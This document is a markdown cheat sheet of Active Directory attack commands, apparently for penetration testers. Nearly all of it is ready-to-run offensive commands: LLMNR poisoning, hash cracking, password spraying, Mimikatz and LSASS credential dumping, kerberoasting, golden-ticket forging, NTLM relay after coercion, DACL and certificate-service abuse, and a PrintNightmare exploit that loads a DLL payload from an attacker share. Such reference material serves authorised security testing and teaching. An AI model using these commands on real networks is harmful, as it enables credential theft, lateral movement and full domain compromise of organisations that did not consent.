## Reconnaissance

### Responder
LLMNR / NBT-NS / mDNS poisoning to capture password hashes on the local segment.

**Responder** — poison broadcast protocols, capture NetNTLM hashes
```bash
sudo responder -I eth0 -wrf
```

**Inveigh** — Windows-native alternative, run from PowerShell
```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh -NBNS Y -LLMNR Y -HTTP Y -ConsoleOutput Y
```

**pretender** — poisoning + relay combined, mDNS/LLMNR/DHCPv6 aware
```bash
sudo pretender -i eth0 --ntlmrelayx
```

**hashcat** — crack captured NetNTLMv2 hashes offline
```bash
hashcat -m 5600 hashes.txt rockyou.txt
```

**john** — alternative offline cracker
```bash
john --format=netntlmv2 hashes.txt --wordlist=rockyou.txt
```

### Password Policies
Know lockout thresholds before spraying to avoid locking out accounts.

**netexec** (formerly crackmapexec) — pull domain password policy
```bash
netexec smb <dc-ip> -u '' -p '' --pass-pol
```

**rpcclient** — query policy manually
```bash
rpcclient -U "" -N <dc-ip> -c "getdompwinfo"
```

**enum4linux-ng** — broader SMB/LDAP enumeration including policy
```bash
enum4linux-ng -P <dc-ip>
```

**kerbrute** — validate usernames safely before spraying
```bash
kerbrute userenum -d domain.local --dc <dc-ip> userlist.txt
```

Then, once policy is known, spray safely:
```bash
netexec smb <dc-ip> -u users.txt -p 'Summer2026!' --continue-on-success
```

### DNS
Map the environment before touching hosts.

**dnsrecon** — zone transfers, subdomain brute force
```bash
dnsrecon -d domain.local -n <dc-ip> -a
```

**adidnsdump** — dump AD-integrated DNS zone via LDAP
```bash
adidnsdump -u domain\\user -p Password1 ldap://<dc-ip>
```

**dig** — manual zone transfer attempt
```bash
dig axfr domain.local @<dc-ip>
```

**PowerMad** — create/abuse AD-integrated DNS records (from a domain-joined host)
```powershell
Import-Module .\Powermad.ps1
New-ADIDNSNode -Node "attacker" -Data "10.10.10.10" -Verbose
```

### Enumeration
Build the picture: users, groups, computers, shares, ACLs.

**SharpHound** — collector run on a domain-joined Windows host
```powershell
.\SharpHound.exe -c All
```

**bloodhound-python** — collector run from Linux
```bash
bloodhound-python -u user -p pass -d domain.local -ns <dc-ip> -c All
```

**ldapdomaindump** — dump LDAP into browsable HTML/JSON
```bash
ldapdomaindump -u 'domain\user' -p pass <dc-ip>
```

**netexec** — SMB / LDAP / WinRM enumeration
```bash
netexec smb <dc-ip> -u user -p pass --shares
netexec ldap <dc-ip> -u user -p pass --users
```

**PowerView** — interactive AD object enumeration
```powershell
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | Select SamAccountName
```

**ldapsearch** — manual raw LDAP queries
```bash
ldapsearch -x -H ldap://<dc-ip> -D "user@domain.local" -w pass -b "DC=domain,DC=local" "(objectClass=user)"
```

**windapsearch** — fast targeted LDAP enumeration
```bash
python3 windapsearch.py -d domain.local --dc-ip <dc-ip> -u user -p pass --da
```

## Movement

### Credentials
Harvest and reuse credentials across the domain.

**secretsdump.py** (Impacket) — dump SAM / LSA / NTDS remotely
```bash
secretsdump.py domain/user:pass@<target-ip>
```

**Mimikatz** — LSASS memory credential extraction, run on target
```powershell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**netexec** — remote SAM/LSA dump over SMB
```bash
netexec smb <target-ip> -u user -p pass --sam
netexec smb <target-ip> -u user -p pass --lsa
```

**LaZagne** — recover creds from local apps and browsers
```bash
lazagne.exe all
```

**nanodump** — lightweight, more evasive LSASS dumper
```powershell
nanodump.exe --write C:\Windows\Temp\dump.dmp
```

**DonPAPI** — dump DPAPI-protected secrets across the domain
```bash
DonPAPI.py domain/user:pass@<target-ip>
```

### Kerberos
Abuse the ticketing system directly.

**Kerberoasting** — crack SPN service account hashes
```bash
GetUserSPNs.py domain/user:pass -dc-ip <dc-ip> -request
hashcat -m 13100 spn_hashes.txt rockyou.txt
```

**Rubeus kerberoast** — from a domain-joined Windows host
```powershell
Rubeus.exe kerberoast /outfile:hashes.txt
```

**AS-REP Roasting** — target no-preauth accounts
```bash
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip <dc-ip>
```

**Rubeus asreproast**
```powershell
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

**Golden Ticket** — Mimikatz, once you have the krbtgt hash
```powershell
mimikatz.exe "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt"
```

**ticketer.py** (Impacket) — forge tickets from Linux
```bash
ticketer.py -nthash <krbtgt-hash> -domain-sid S-1-5-21-... -domain domain.local Administrator
```

**Rubeus ptt** — pass-the-ticket
```powershell
Rubeus.exe ptt /ticket:ticket.kirbi
```

**findDelegation.py** — enumerate constrained/unconstrained delegation
```bash
findDelegation.py domain/user:pass -dc-ip <dc-ip>
```

**Rubeus s4u** — abuse constrained delegation
```powershell
Rubeus.exe s4u /user:svc_account /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
```

### MITM / Coerced Authentication
Force machines to authenticate to you, then relay it.

**PetitPotam** — coerce DC auth via MS-EFSRPC
```bash
python3 PetitPotam.py -u user -p pass <listener-ip> <dc-ip>
```

**Coercer** — automated multi-protocol coercion
```bash
coercer coerce -u user -p pass -d domain.local -l <listener-ip> -t <target-ip>
```

**ntlmrelayx.py** (Impacket) — relay captured NTLM auth
```bash
ntlmrelayx.py -t ldap://<dc-ip> --escalate-user <controlled-user>
```

**SpoolSample** — coerce via MS-RPRN spooler
```bash
SpoolSample.exe <target-ip> <listener-ip>
```

**mitm6** — IPv6/DHCPv6 spoofing combined with relay
```bash
sudo mitm6 -d domain.local
# in a second terminal:
ntlmrelayx.py -6 -t ldaps://<dc-ip> -wh fakewpad.domain.local -l loot
```

### DACL Abuse
Exploit misconfigured permissions on AD objects.

**pywhisker** — abuse GenericAll/GenericWrite via shadow credentials
```bash
pywhisker.py -d domain.local -u user -p pass --target victim --action add
```

**PowerView** — ForceChangePassword abuse
```powershell
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'NewPass1!' -AsPlainText -Force)
```

**net rpc password** — reset a password remotely via SMB
```bash
net rpc password "victim" "NewPass1!" -U domain.local/user%pass -S <dc-ip>
```

**bloodyAD** — abuse WriteDACL / AddMember rights
```bash
bloodyAD -d domain.local -u user -p pass --host <dc-ip> add groupMember "Domain Admins" user
```

**Whisker** — shadow credentials from a Windows host
```powershell
Whisker.exe add /target:victim
```

### Trust Abuse
Cross forest and domain trust boundaries.

**BloodHound** — map trust paths, SID history, cross-trust delegation (use collected data, no extra command — analyze in the GUI)

**raiseChild.py** (Impacket) — child-to-parent domain escalation
```bash
raiseChild.py domain.local/user:pass
```

**Rubeus renew / s4u** — cross-trust ticket abuse
```powershell
Rubeus.exe renew /ticket:ticket.kirbi /ptt
```

**ticketer.py** — forge inter-realm TGTs with SID history
```bash
ticketer.py -nthash <krbtgt-hash> -domain-sid S-1-5-21-... -domain child.domain.local -extra-sid S-1-5-21-<parent>-519 Administrator
```

### ADCS
Attack misconfigured Active Directory Certificate Services templates (ESC1–ESC8+).

**Certipy find** — enumerate vulnerable templates
```bash
certipy find -u user@domain.local -p pass -dc-ip <dc-ip> -vulnerable
```

**Certipy req** — request a certificate abusing a vulnerable template
```bash
certipy req -u user@domain.local -p pass -ca CA-NAME -template VulnTemplate -upn administrator@domain.local
```

**Certipy auth** — authenticate with the resulting certificate
```bash
certipy auth -pfx administrator.pfx -dc-ip <dc-ip>
```

**Certify** — .NET equivalent, run on a Windows host
```powershell
Certify.exe find /vulnerable
Certify.exe request /ca:CA-NAME /template:VulnTemplate
```

**PKINITtools** — get a TGT from a certificate
```bash
gettgtpkinit.py -cert-pfx administrator.pfx domain.local/administrator ticket.ccache
```

**Coercer + Certipy relay** — coerce and relay to the CA HTTP endpoint (ESC8)
```bash
certipy relay -ca <ca-ip> -template DomainController
coercer coerce -u user -p pass -d domain.local -l <relay-ip> -t <dc-ip>
```

### Printers
Abuse the print spooler for coercion and lateral movement.

**Printerbug.py** (Impacket) — coerce authentication from a target's spooler
```bash
printerbug.py domain/user:pass@<victim-ip> <listener-ip>
```

**SpoolSample** — Windows equivalent
```bash
SpoolSample.exe <victim-ip> <listener-ip>
```

**Coercer** — same, plus fallback protocols if spooler is patched
```bash
coercer coerce -u user -p pass -d domain.local -l <listener-ip> -t <victim-ip> --always-continue
```

**PrintNightmare (CVE-2021-1675)** — legacy spooler RCE, widely documented PoCs
```bash
python3 CVE-2021-1675.py domain.local/user:pass@<target-ip> '\\<attacker-ip>\share\payload.dll'
```
